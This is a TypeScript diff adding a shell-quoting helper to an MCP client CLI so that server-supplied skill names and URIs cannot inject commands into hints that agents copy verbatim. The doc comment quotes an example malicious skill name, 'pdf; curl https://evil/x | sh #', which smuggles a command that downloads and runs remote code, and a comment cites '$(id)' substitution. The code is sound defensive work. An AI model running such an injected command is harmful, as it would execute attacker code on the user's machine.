@@ -800,3 +800,27 @@ export function enrichErrorMessage(errorMessage: string, serverUrl?: string): st
   // No enrichment possible
   return errorMessage;
 }
+
+/**
+ * Quote a value for a copy-paste shell hint. Server-controlled strings — a skill name, a
+ * resource URI — are interpolated into `run: mcpc …` hints that agents follow verbatim, so
+ * anything outside a conservative safe set is wrapped in double quotes with the characters
+ * that stay special inside them escaped. A skill named `pdf; curl https://evil/x | sh #`
+ * then stays one argument instead of ending the command and starting another.
+ *
+ * Same rules as `formatPath` in `src/cli/output.ts` (which delegates here). Human-readable output only; never use
+ * it for `--json` output.
+ */
+export function quoteShellArg(value: string, platform: NodeJS.Platform = process.platform): string {
+  const isSafe =
+    platform === 'win32'
+      ? /^[A-Za-z0-9_./:@%+,=~\\-]+$/.test(value)
+      : /^[A-Za-z0-9_./:@%+,=~-]+$/.test(value);
+  if (isSafe) return value;
+  // Inside POSIX double quotes `$`, a backtick, `"` and `\` stay special. The backslash must be
+  // escaped too: left alone, `\$(id)` would render as `\\$(id)`, where `\\` is a literal backslash
+  // and `$(id)` still runs, and a trailing backslash would escape the closing quote. On Windows
+  // the backslash is the path separator and is passed through unchanged.
+  const special = platform === 'win32' ? /(["`$])/g : /(["`$\\])/g;
+  return `"${value.replace(special, '\\$&')}"`;
+}
